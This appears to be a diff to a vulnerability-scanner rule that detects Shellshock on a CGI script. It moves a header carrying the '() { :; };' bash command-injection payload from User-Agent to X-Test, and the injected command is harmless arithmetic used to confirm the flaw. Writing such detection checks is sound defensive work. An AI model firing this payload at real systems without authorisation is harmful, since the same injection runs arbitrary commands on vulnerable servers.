@@ -7,7 +7,7 @@ rules:
     path: /cgi-bin/jarrewrite.sh
     follow_redirects: false
     headers:
-      User-Agent: () { :; }; echo ; /bin/bash -c 'expr {{r1}} - {{r2}}'
+      X-Test: () { :; }; echo ; /bin/bash -c 'expr {{r1}} - {{r2}}'
     expression: |
       response.status == 200 && response.body.bcontains(bytes(string(r1 - r2)))
 detail:
